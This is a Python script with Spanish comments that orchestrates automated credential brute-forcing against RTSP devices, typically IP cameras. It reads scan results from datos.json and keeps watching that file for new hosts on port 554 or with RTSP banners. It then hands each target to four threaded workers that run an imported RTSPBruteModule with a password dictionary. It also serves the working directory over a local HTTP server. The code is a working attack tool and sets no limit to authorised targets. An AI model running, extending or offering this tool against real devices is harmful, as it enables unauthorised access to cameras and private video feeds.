import os
import socket
import json
import time
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
from queue import Queue

from rtspBrute import RTSPBruteModule
from common import cargar_datos, actualizar_datos

class NoCacheHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        try:
            super().do_GET()
        except ConnectionAbortedError:
            print("Se ha producido una conexión abortada por el cliente.")

    def end_headers(self):
        self.send_header('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0')
        super().end_headers()

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        s.connect(('10.254.254.254', 1))
        ip_address = s.getsockname()[0]
    except Exception:
        ip_address = '127.0.0.1'
    finally:
        s.close()
    return ip_address

def start_http_server():
    ip_address = get_ip_address()  # Obtener la dirección IPv4 local
    port = 8080
    server_address = (ip_address, port)
    httpd = HTTPServer(server_address, NoCacheHandler)
    print(f'Servidor iniciado en http://{ip_address}:{port}')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Servidor detenido.")
        httpd.server_close()

def brute_force_worker(q, dictionary_file):
    while True:
        target = q.get()
        if target is None:
            break
        ip, port = target
        brute = RTSPBruteModule()
        brute.setup(targets=[(ip, port)], dictionary_file=dictionary_file)
        brute.run()
        q.task_done()

processed_targets = set()

def monitor_json_changes(json_file, q):
    try:
        last_size = os.path.getsize(json_file)
    except Exception:
        last_size = 0
    while True:
        time.sleep(5)
        try:
            new_size = os.path.getsize(json_file)
        except Exception:
            continue
        if new_size != last_size:
            last_size = new_size
            data = cargar_datos()
            nuevos = [(entry['IP'], entry['Puerto'])
                      for entry in data
                      if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]
            for target in nuevos:
                if target not in processed_targets:
                    processed_targets.add(target)
                    q.put(target)

if __name__ == '__main__':
    threading.Thread(target=actualizar_datos, daemon=True).start()
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()

    json_file = 'datos.json'
    data = cargar_datos()
    targets = [(entry['IP'], entry['Puerto'])
               for entry in data
               if 'RTSP' in entry.get('Banner', '') or entry.get('Puerto') == 554]

    q = Queue()
    for target in targets:
        processed_targets.add(target)
        q.put(target)

    dictionary_file = "diccionario.txt"  # Asegúrese de que este archivo exista
    num_worker_threads = 4  # Ajuste según sea necesario
    for _ in range(num_worker_threads):
        threading.Thread(target=brute_force_worker, args=(q, dictionary_file), daemon=True).start()

    threading.Thread(target=monitor_json_changes, args=(json_file, q), daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Programa finalizado.")
